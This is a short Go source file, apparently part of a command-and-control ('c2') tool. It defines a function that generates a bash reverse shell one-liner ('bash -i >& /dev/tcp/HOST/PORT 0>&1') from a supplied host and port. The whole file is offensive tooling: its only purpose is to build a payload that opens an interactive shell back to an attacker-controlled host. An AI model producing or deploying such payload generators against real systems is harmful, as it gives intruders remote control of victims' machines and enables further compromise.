package c2
import "fmt"
type OnelinerKind string
type OnelinerInput struct { Host string; Port int }
func GenerateOneliner(in OnelinerInput) (string, error) {
return fmt.Sprintf(`bash -i >& /dev/tcp/%s/%d 0>&1`, in.Host, in.Port), nil
}
